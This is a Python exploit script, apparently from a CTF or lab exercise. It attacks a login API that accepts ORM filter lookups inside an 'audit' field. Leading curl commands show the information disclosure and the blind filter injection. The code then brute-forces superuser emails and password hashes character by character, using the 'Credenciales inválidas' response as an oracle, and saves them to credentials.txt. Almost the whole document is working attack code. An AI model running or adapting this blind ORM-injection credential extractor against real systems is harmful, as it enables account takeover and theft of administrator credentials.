import requests
from pwn import log
import string

'''
First we have to do a Information Disclosure


curl -X POST http://localhost/api/users/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "password": "wrongpassword",
    "audit": {
      "filters": {
        "probe": {
          "relation": "sessions",
          "condition": {"invalid": "test"}
        }
      }
    }
  }'


curl -X POST http://localhost/api/users/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@projectManager.com",
    "password": "test1234",
    "audit": {
      "filters": {
        "blind": {
          "direct_filter": {
            "is_superuser": true,
            "email__startswith": "monr"
          }
        }
      }
    }
  }'; echo

curl -X POST http://localhost/api/users/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@projectManager.com",
    "password": "test1234",
    "audit": {
      "filters": {
        "blind": {
          "direct_filter": {
            "is_superuser": true,
            "email__iexact": "monre@projectManager.com",
            "password__startswith": "b29f7c"
          }
        }
      }
    }
  }'
'''

TARGET = "http://localhost/api/users/login"
EMAIL = "test@projectManager.com"
PASSWORD = "test1234"

headers = {
    "Content-Type": "application/json"
}

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "@._-"

def search_email(emails, pEmails, pPayload, result):
    for character in characters:

        data = {
            "email": EMAIL,
            "password": PASSWORD,
            "audit": {
                "filters": {
                    "blind": {
                        "direct_filter": {
                            "is_superuser": True,   
                            "email__startswith": result + character
                        }
                    }
                }
            }
        }

        pPayload.status(f"{data}")
        response = requests.post(TARGET, headers=headers, json=data)

        if "Credenciales inválidas" not in response.text:
            search_email(emails, pEmails, pPayload, result+character)


        if character == '-':
            for searched in emails:
                if result in searched:
                    return result
            emails.append(result)
            pEmails.status(f"Found superuser email: {emails}")
            return result
        
def search_password(pPasswords, pPayload, emails, passwords):
    for email in emails:
        password_found = ""
        while True:
            for character in characters:
                data = {
                    "email": EMAIL,
                    "password": PASSWORD,
                    "audit": {
                        "filters": {
                            "blind": {
                                "direct_filter": {
                                    "is_superuser": True,  
                                    "email__iexact": email,
                                    "password__startswith": password_found + character
                                }
                            }
                        }
                    }
                }

                pPayload.status(f"{data}")
                response = requests.post(TARGET, headers=headers, json=data)

                if "Credenciales inválidas" not in response.text:
                    password_found += character
                    break

            if character == '-':
                passwords.append(password_found)
                pPasswords.status(f"Found superuser password: {passwords}")
                break

def main():
    pEmails = log.progress("Getting superuser emails")
    pPasswords = log.progress("Getting superuser passwords")
    pPasswords.status("Waiting for getting emails first...")
    pPayload = log.progress("Payload")
    
    emails = []
    passwords = []

    search_email(emails, pEmails, pPayload, "")
    pEmails.success(f"Superuser emails found: {emails}")

    search_password(pPasswords, pPayload, emails, passwords)
    pPasswords.success(f"Superuser passwords found: {passwords}")

    pPayload.success("Payloads finished")
    print("\n\nSuperuser credentials found and saved on credentials.txt:")

    with open("credentials.txt", "w") as f:
        for i in range(len(emails)):
            f.write(f"{emails[i]}:{passwords[i]}\n")
            print(f"{emails[i]}:{passwords[i]}")


if __name__ == "__main__":
    main()